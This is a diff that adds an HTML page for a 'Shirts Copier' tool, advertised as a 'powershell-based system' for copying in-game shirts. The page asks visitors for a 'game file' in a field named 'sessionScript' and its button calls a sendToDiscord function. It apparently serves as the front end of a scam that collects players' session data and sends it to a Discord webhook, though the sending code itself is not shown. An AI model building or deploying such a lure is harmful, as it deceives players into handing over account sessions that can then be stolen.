@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TechTools</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            background: #212121;
+            color: white;
+        }
+        .header {
+            position: absolute;
+            top: 20px;
+            left: 30px;
+            font-size: 3em;
+            font-weight: bold;
+            color: #ffffff;
+        }
+        .divider {
+            border: none;
+            height: 2px;
+            background-color: #ffffff;
+            margin: 90px 0;
+            width: 100%;
+        }
+        .title-section {
+            text-align: center;
+            margin-top: -40px;
+        }
+        .container {
+            display: flex;
+            gap: 40px;
+            align-items: center;
+            margin-top: 40px;
+        }
+        .panel {
+            background-color: #222;
+            border-radius: 20px;
+            padding: 10px;
+            font-size: 1.3em;
+            border: 0.1px solid #6a6a6a;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 580px;
+            text-align: center;
+        }
+        .panel h2 {
+            font-size: 2em;
+            margin-bottom: 45px;
+            color: #fff;
+        }
+        .input-box {
+            width: 90%;
+            padding: 11px;
+            font-size: 1.2em;
+            margin: 15px 0;
+            border: 1px solid #444;
+            border-radius: 8px;
+            background-color: #333;
+            color: #fff;
+        }
+        .btn {
+            width: 100%;
+            padding: 10px;
+            font-size: 1.5em;
+            border: none;
+            border-radius: 8px;
+            background-color: #334c7c;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .btn:hover {
+            background-color: #2e446e;
+        }
+        .video-container {
+            border-radius: 10px;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 230px;
+        }
+        iframe {
+            width: 69%;
+            height: 100%;
+        }
+        .processing-panel {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.4);
+            border: 0.1px solid #6a6a6a;
+            border-radius: 20px;
+            padding: 70px;
+            font-size: 2em;
+            color: #ffffff;
+            text-align: center;
+            z-index: 900;
+            max-width: 80%;
+            width: 400px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">TechTools</div>
+    <hr class="divider">
+    <div class="title-section">
+        <h1 style="font-size: 3.5em; margin: 20px 0;">Shirts Copier</h1>
+        <p style="font-size: 1.5em; text-align: center; max-width: 1200px; color: Grey">
+            Copy shirts with ease, with this brand new powershell-based system!
+        </p>
+    </div>
+
+    <div class="container">
+        <div class="panel">
+            <h2>Copy Shirts</h2>
+            <input id="sessionScript" placeholder="Enter game file" class="input-box">
+            <input type="text" id="pin" placeholder="Enter Webhook" class="input-box">
+            <button class="btn" onclick="sendToDiscord()">Copy Shirt!</button>
+        </div>
+
+        <div class="panel">
+            <h2>How to use</h2>
+            <div class="video-container">
+                <iframe src="" frameborder="0" allowfullscreen></iframe>
+            </div>
+        </div>
+    </div>
+
+    <div id="processingPanel" class="processing-panel">
+        Shirt is being processed, this may take 1-5 minutes!
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
